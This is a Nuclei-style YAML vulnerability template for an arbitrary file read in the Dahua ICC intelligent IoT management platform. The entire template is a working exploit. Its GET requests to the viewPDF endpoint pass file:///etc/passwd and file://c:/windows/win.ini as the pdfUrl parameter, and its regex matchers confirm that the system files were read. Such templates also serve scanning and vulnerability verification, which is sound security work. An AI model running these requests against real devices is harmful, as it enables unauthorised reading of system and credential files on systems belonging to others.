id: dahua-icc-viewPDF-fileread
info:
  name: 大华ICC智能物联综合管理平台 viewPDF 存在任意文件读取
  author: leadlife
  severity: high
  description: 
  reference: 
    - https://vip.bdziyi.com/60420/
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
    tips:
    repair:
    version:
  tags: fileread,dahua,icc

http:
  - method: GET
    path:
      - "{{BaseURL}}/evo-apigw/evo-cirs/material/viewPDF?filename=x.pdf&pdfUrl=file:///etc/passwd"
      - "{{BaseURL}}/evo-apigw/evo-cirs/material/viewPDF?filename=x.pdf&pdfUrl=file://c:/windows/win.ini"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "\\[(font|extension|file)s\\]"
        condition: or

      - type: status
        status:
          - 200